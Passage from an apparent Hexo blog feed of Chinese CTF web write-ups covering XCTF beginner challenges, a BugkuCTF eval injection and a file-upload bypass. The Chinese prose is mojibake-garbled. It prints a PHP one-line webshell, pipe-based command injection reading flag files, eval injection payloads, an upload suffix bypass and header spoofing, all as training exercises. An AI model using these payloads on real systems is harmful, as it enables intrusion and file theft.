<p>è€Œæœ€ç»ˆçš„æ–‡ä»¶ååç¼€å–çš„æ˜¯<code>$file[count($file) - 1]</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®©<code>$file</code>ä¸ºæ•°ç»„ã€‚<br><code>$file[0]</code>ä¸º<code>shell.php/</code>ï¼Œä¹Ÿå°±æ˜¯<code>reset($file)</code>ï¼Œç„¶åå†ä»¤<code>$file[2]</code>ä¸ºç™½åå•ä¸­çš„jpgã€‚<br>æ­¤æ—¶<code>end($file)</code>ç­‰äºjpgï¼Œ<code>$file[count($file) - 1]</code>ä¸ºç©ºã€‚<br>è€Œ <code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>ï¼Œä¹Ÿå°±æ˜¯<code>shell.php/.</code>ï¼Œæœ€ç»ˆ<code>move_uploaded_file</code>ä¼šå¿½ç•¥æ‰<code>/.</code>ï¼Œæœ€ç»ˆä¸Šä¼ <code>shell.php</code>ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm5w7zj30f10a474h.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm5w7zj30f10a474h.jpg" class="lazyload" title="test"></a><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm7y8sj30v20c0gox.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm7y8sj30v20c0gox.jpg" class="lazyload" title="test"></a></p>
<h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>è™½ç„¶å¾ˆå¤šçš„é¢˜éƒ½æ˜¯è€ƒçš„åŸºç¡€ï¼Œä½†è¿˜æ˜¯å­¦åˆ°äº†è®¸å¤šæ–°çš„çŸ¥è¯†ï¼Œç»§ç»­åŠªåŠ›å§ï¼</p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>XCTF adworld webï¼ˆæ–°æ‰‹å…¥é—¨ç¯‡ï¼‰</title>
    <url>/yakko117/2019/03/17/XCTF%20adworld%20web%EF%BC%88%E6%96%B0%E6%89%8B%E5%85%A5%E9%97%A8%E7%AF%87%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="æ–°æ‰‹è®­ç»ƒ"><a href="#æ–°æ‰‹è®­ç»ƒ" class="headerlink" title="æ–°æ‰‹è®­ç»ƒ"></a>æ–°æ‰‹è®­ç»ƒ</h1><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p>ç›´æ¥ F12 æŸ¥çœ‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5isdp4j30nm06w4l5.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5isdp4j30nm06w4l5.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p>ç‚¹å¼€é¢˜ç›®çœ‹åˆ°é¢˜ç›®è¦æ±‚</p>
<blockquote>
<p>è¯·ç”¨GETæ–¹å¼æäº¤ä¸€ä¸ªåä¸ºaï¼Œå€¼ä¸º1çš„å˜é‡</p>
</blockquote>
<p>è¾“å…¥ <code>?a=1</code> åï¼Œå›æ˜¾æ–°çš„è¯·æ±‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5go0hyj30w30biq3u.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5go0hyj30w30biq3u.jpg" class="lazyload" title="test"></a><br>ç„¶åçœ‹åˆ°postè¯·æ±‚ï¼Œéšåè·å¾—flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5gs9dgj30uu0knwgf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5gs9dgj30uu0knwgf.jpg" class="lazyload" title="test"></a> </p>
<hr>
<h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong> Xè€å¸ˆä¸Šè¯¾è®²äº†Robotsåè®®ï¼Œå°å®åŒå­¦å´ä¸Šè¯¾æ‰“äº†çŒç¡ï¼Œèµ¶ç´§æ¥æ•™æ•™å°å®Robotsåè®®æ˜¯ä»€ä¹ˆå§</p>
<p>ç”±é¢˜ç›®å¾—çŸ¥éœ€æ‰«æç›®å½•</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5gq7s2j30jw09k74y.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5gq7s2j30jw09k74y.jpg" class="lazyload" title="test"></a> </p>
<p>ç‚¹å¼€ <code>robots.txt</code> ï¼Œå‘ç° <strong><em>f1ag_1s_h3re.php</em></strong><br>éšåå¾—åˆ°flag</p>
<hr>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong> Xè€å¸ˆå‘Šè¯‰å°å®ä»–åœ¨cookieé‡Œæ”¾äº†äº›ä¸œè¥¿ï¼Œå°å®ç–‘æƒ‘åœ°æƒ³ï¼šâ€œcookieæ˜¯å¤¹å¿ƒé¥¼å¹²çš„æ„æ€å—ï¼Ÿâ€</p>
<p>ç‚¹å¼€æŸ¥çœ‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5guaoyj317l0ni0vl.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5guaoyj317l0ni0vl.jpg" class="lazyload" title="test"></a></p>
<p>æŸ¥çœ‹tip è¿›å…¥ <code>cookie.php</code> å¾—åˆ°flag</p>
<hr>
<h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong> Xè€å¸ˆä»Šå¤©ä¸Šè¯¾è®²äº†å‰ç«¯çŸ¥è¯†ï¼Œç„¶åç»™å¤§å®¶ä¸€ä¸ªä¸èƒ½æŒ‰çš„æŒ‰é’®ï¼Œå°å®æƒŠå¥‡åœ°å‘ç°è¿™ä¸ªæŒ‰é’®æŒ‰ä¸ä¸‹å»ï¼Œåˆ°åº•æ€ä¹ˆæ‰èƒ½æŒ‰ä¸‹å»å‘¢ï¼Ÿ</p>
<p>åˆ é™¤ <code>disabled</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5larhkj31430e2qv6.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y5larhkj31430e2qv6.jpg" class="lazyload" title="test"></a></p>
<p>å¾—åˆ°flag</p>
<hr>
<h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p>ç‚¹å¼€å‘ç°</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8lyjaij30gf08ywyw.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8lyjaij30gf08ywyw.jpg" class="lazyload" title="test"></a></p>
<p>ä¸ç®¡è¾“å…¥ä»€ä¹ˆå›æ˜¾éƒ½ä¸€æ ·</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jfaudj30c507tq2s.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jfaudj30c507tq2s.jpg" class="lazyload" title="test"></a></p>
<p>æŸ¥çœ‹æºä»£ç </p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jkduoj31ax0o9dk3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jkduoj31ax0o9dk3.jpg" class="lazyload" title="test"></a></p>
<p>å‘ç°å…¶ä¸­ <code>pass</code> ä¸ºå‡å¯†ç ,å¯ä»¥çœ‹åˆ°æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½ä¼šè¿”å›è¿™ä¸ªå‡å¯†ç ,çœŸæ­£çš„å¯†ç <br>çœŸæ­£çš„å¯†ç ï¼š</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jhvzrj30vk01sdgp.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jhvzrj30vk01sdgp.jpg" class="lazyload" title="test"></a></p>
<p>ç”¨python2.7è·‘ </p>
<blockquote>
<p>s=â€\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30â€</p>
</blockquote>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jh3gij30y105et8w.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jh3gij30y105et8w.jpg" class="lazyload" title="test"></a></p>
<p>å¾—åˆ° <code>55,56,54,79,115,69,114,116,107,49,50</code></p>
<p>å†ç”¨pyè·‘</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> future <span class="keyword">import</span> print_function</span><br><span class="line">s=[<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(chr(i),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ° <code>786OsErtk12</code></p>
<hr>
<h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong> Xè€å¸ˆå‘Šè¯‰å°å®å…¶å®xffå’Œrefereræ˜¯å¯ä»¥å¾®æ“çš„<br>ç‚¹å¼€é“¾æ¥</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jjs7jj30al01n40o.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jjs7jj30al01n40o.jpg" class="lazyload" title="test"></a></p>
<p>ä½¿ç”¨Bpæ‹¦æˆªä¿®æ”¹<br>æ·»åŠ  xff ä¼ªé€ ip</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:123.123.123.123</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jkw65j316n0iu42a.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jkw65j316n0iu42a.jpg" class="lazyload" title="test"></a></p>
<p>å‘ç°éœ€æ±‚å¢åŠ  è¯·æ±‚éœ€è¦ä»è°·æ­Œæ¥æº</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">referer:https:&#x2F;&#x2F;www.google.com</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jmjb2j31730gqtcm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g14y8jmjb2j31730gqtcm.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong>å°å®å†™äº†ä¸€ä¸ªç™»é™†éªŒè¯é¡µé¢ï¼Œéšæ‰‹å°±è®¾äº†ä¸€ä¸ªå¯†ç ã€‚<br>è¿›å…¥é¡µé¢å›æ˜¾</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag5on9j30h60dhq2x.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag5on9j30h60dhq2x.jpg" class="lazyload" title="test"></a></p>
<p>éšæ‰‹å°è¯•ç‚¹å‡»login å›æ˜¾</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162afyp9kj30am04wq2t.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162afyp9kj30am04wq2t.jpg" class="lazyload" title="test"></a></p>
<p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°tips</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag2o0hj30mz099t8s.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag2o0hj30mz099t8s.jpg" class="lazyload" title="test"></a></p>
<p>å°è¯•å¼±å£ä»¤çˆ†ç ´</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag0zwfj30z60lamyv.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag0zwfj30z60lamyv.jpg" class="lazyload" title="test"></a></p>
<p>è®¾ç½®ä¸ºå¯†ç çˆ†ç ´</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag0tapj30uy0hv75r.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag0tapj30uy0hv75r.jpg" class="lazyload" title="test"></a></p>
<p>æ·»åŠ å­—å…¸å <strong>attack start</strong></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162afzmqaj30fh07u0sx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162afzmqaj30fh07u0sx.jpg" class="lazyload" title="test"></a></p>
<p>æµ‹è¯•åå‘ç° <code>123456</code> çš„é•¿åº¦ä¸åŒï¼ŒæŸ¥çœ‹åå¾—åˆ°flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag279sj30qr091gma.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162ag279sj30qr091gma.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong>å°å®å¬è¯´phpæ˜¯æœ€å¥½çš„è¯­è¨€,äºæ˜¯å¥¹ç®€å•å­¦ä¹ ä¹‹åå†™äº†å‡ è¡Œphpä»£ç ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>Â </span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    $a=@$_GET[<span class="string">'a'</span>];</span><br><span class="line">    $b=@$_GET[<span class="string">'b'</span>];</span><br><span class="line">    <span class="keyword">if</span>($a==<span class="number">0</span>Â <span class="keyword">and</span>Â $a)&#123;</span><br><span class="line">    Â Â Â Â <span class="keyword">echo</span>Â $flag1;</span><br><span class="line">    &#125;Â </span><br><span class="line">    <span class="keyword">if</span>(is_numeric($b))&#123;</span><br><span class="line">    Â Â Â Â <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($b&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    Â Â Â Â <span class="keyword">echo</span>Â $flag2;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>å‰åŠæ®µå¯ä»¥ç”¨ï¼š</p>
<blockquote>
<p><a href="http://111.198.29.45:30668/index.php?a=a" target="_blank" rel="noopener">http://111.198.29.45:30668/index.php?a=a</a></p>
</blockquote>
<p>åŒç† <code>var_dump(&#39;1234a&#39; == 1234)</code><br>ç»“æœä¸º <code>true</code> ,phpçš„å¼±ç±»å‹æ¯”è¾ƒä¼šå¿½ç•¥å­—æ¯a</p>
<p>æ‰€ä»¥ååŠæ®µå¯ä»¥ç”¨ï¼š</p>
<blockquote>
<p><a href="http://111.198.29.45:30668/index.php?a=a&amp;b=1235a" target="_blank" rel="noopener">http://111.198.29.45:30668/index.php?a=a&amp;b=1235a</a></p>
</blockquote>
<hr>
<h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong>å°å®ç™¾åº¦äº†phpä¸€å¥è¯,è§‰ç€å¾ˆæœ‰æ„æ€,å¹¶ä¸”æŠŠå®ƒæ”¾åœ¨index.phpé‡Œ.</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmdrbfj30aj037q2z.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmdrbfj30aj037q2z.jpg" class="lazyload" title="test"></a></p>
<p><code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code> ä¸€å¥è¯æœ¨é©¬æ”¾ç½®äº <code>index.php</code>,é‡‡ç”¨èœåˆ€é“¾æ¥<br>æŸ¥çœ‹æ–‡ä»¶å‘ç° <code>flag.txt</code> ,æ‰“å¼€å¾—åˆ°flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmf5taj30k20890sx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmf5taj30k20890sx.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p><strong>é¢˜ç›®æè¿°ï¼š</strong>å°å®å†™äº†ä¸ªpingåŠŸèƒ½,ä½†æ²¡æœ‰å†™waf,Xè€å¸ˆå‘Šè¯‰å¥¹è¿™æ˜¯éå¸¸å±é™©çš„ï¼Œä½ çŸ¥é“ä¸ºä»€ä¹ˆå—ã€‚</p>
<p>ä¸€ä¸ªç®€å•çš„å‘½ä»¤æ‰§è¡Œæ¼æ´<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmdc24j30c6071aa1.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmdc24j30c6071aa1.jpg" class="lazyload" title="test"></a></p>
<p>å°è¯• <code>ping IP | ls</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmfeypj30h60axaa2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmfeypj30h60axaa2.jpg" class="lazyload" title="test"></a></p>
<p>åœ¨ <code>ping IP | ls ../../../</code> å‘ç° home<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmdte1j30kl0gnglr.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmdte1j30kl0gnglr.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå‘ç° <code>flag.txt</code><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmcyobj30jv04at8k.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmcyobj30jv04at8k.jpg" class="lazyload" title="test"></a><br>ç„¶åå°± <code>cat</code> æŠ“å–å°±å¥½äº†<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmd06zj30ix02n3yf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/0077TIyQly1g162gmd06zj30ix02n3yf.jpg" class="lazyload" title="test"></a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€é“ctfé¢˜å°ç»“(è¿˜æ˜¯è‡ªå·±èƒ½åŠ›ä¸è¡Œ)</title>
    <url>/yakko117/2019/03/10/bugku%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BugkuCTF-æœ¬åœ°åŒ…å«"><a href="#BugkuCTF-æœ¬åœ°åŒ…å«" class="headerlink" title="BugkuCTF æœ¬åœ°åŒ…å«"></a>BugkuCTF æœ¬åœ°åŒ…å«</h1><p><a href="http://120.24.86.145:8003/" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a><br>æ€ä¹ˆè¯´å‘¢ï¼Œè™½è¯´ä¸ç®—éš¾ï¼Œä½†æ˜¯è€ƒçš„åŸºç¡€çŸ¥è¯†è¿˜æ˜¯å€¼å¾—æ¢è®¨åˆ†æä¸€ä¸‹çš„</p>
<a id="more"></a>

<h3 id="ä»£ç è§£é‡Š"><a href="#ä»£ç è§£é‡Š" class="headerlink" title="ä»£ç è§£é‡Š"></a>ä»£ç è§£é‡Š</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs277yv3j30cz059t94.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs277yv3j30cz059t94.jpg" class="lazyload" title="test"></a></p>
<p>a. <code>include&quot;flag.php&quot;</code>; æŠŠæˆ‘ä»¬æƒ³è¦çš„å¼—æ‹‰æ ¼è—äº†èµ·æ¥ï¼Œå“¼<br>b. <code>$_request</code>è¿™ä¸ªå˜é‡å¯¹ <code>GET</code> ã€<code>POST</code> éƒ½èƒ½æ¥å—ï¼Œä½†è¿™ä¸ªå…¨å±€å˜é‡åœ¨è¿è¡Œæ—¶ä¿®æ”¹åè€…ä¸ä¼šå½±å“å‰è€…ï¼ˆåä¹‹äº¦ç„¶ï¼‰<br>c. ä»¥<code>get</code> / <code>post</code> / <code>cookies</code> ç­‰æ–¹å¼æŠŠä»¥helloä¸ºåçš„ä¸œè¥¿æäº¤è¿‡æ¥<br>d. evalå‡½æ•°æŠŠå­—ç¬¦ä¸²å½“ä½œå‘½ä»¤ç›´æ¥æ‰§è¡Œ</p>
<hr>
<p>é¦–å…ˆé€‰æ‹© <code>get</code> ä¼ å€¼<br>æ ¹æ®æœ€åŸºæœ¬æ³¨å…¥ <code>&#39;&#39;</code> å¼•å·é—­åˆçš„æ€è·¯ï¼Œå¾ˆå®¹æ˜“å°±æƒ³åˆ°äº†åˆ©ç”¨æ‹¬å·ï¼Œæ¯•ç«Ÿï¼Œ<code>eval</code> ä¸­æ˜¯æ‰§è¡Œçš„ä»£ç æ®µã€‚</p>
<p>æµ‹è¯•ä¸€ä¸‹ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;123.206.87.240:8003&#x2F;index.php?hello&#x3D;%201);print_r(2</span><br></pre></td></tr></table></figure></div>
<p>ä»£ç ç»“åˆèµ·æ¥å°±æ˜¯ï¼š</p>
<pre><code>eval( &quot;var_dump(1);print_r(2);&quot;); </code></pre><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs278b65j30hy05lwep.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs278b65j30hy05lwep.jpg" class="lazyload" title="test"></a><br>å‘ç°è¿˜è¡Œï¼Œæ—¢ç„¶æ‰§è¡Œæ²¡é—®é¢˜ï¼Œå°±å¯ä»¥æ„é€ åå­—ä¸ºhelloçš„æ”»å‡»å‘½ä»¤ï¼ŒæŠŠflag.phpé‡Œé¢çš„ä»£ç ä»¥æ•°ç»„å½¢å¼è¾“å‡ºå‡ºæ¥ã€‚</p>
<p>æœ€ååœ¨urlé‡Œå¦‚æ­¤æ„é€ æ”»å‡»å‘½ä»¤ï¼š</p>
<pre><code>?hello=file(&quot;flag.php&quot;)</code></pre><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs2798yvj31ej065wfd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs2798yvj31ej065wfd.jpg" class="lazyload" title="test"></a></p>
<pre><code>?hello=get_file_contents(&apos;flag.php&apos;) // æˆ–è€…è¿™ç§</code></pre><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs2798yvj31ej065wfd.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs2798yvj31ej065wfd.jpg" class="lazyload" title="test"></a></p>
<pre><code>?hello=1);print_r(file(&quot;./flag.php&quot;)</code></pre><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs279ecpj314c051gm6.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g0xs279ecpj314c051gm6.jpg" class="lazyload" title="test"></a></p>
<p>é™¤äº†ç›´æ¥å°† <strong>flag.php</strong> æ–‡ä»¶è¯»å…¥å˜é‡ <code>hello</code> ä¸­ï¼›è¿˜å¯åˆ©ç”¨ <code>eval()</code> çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä½¿ç”¨helloæ„é€ payloadï¼š</p>
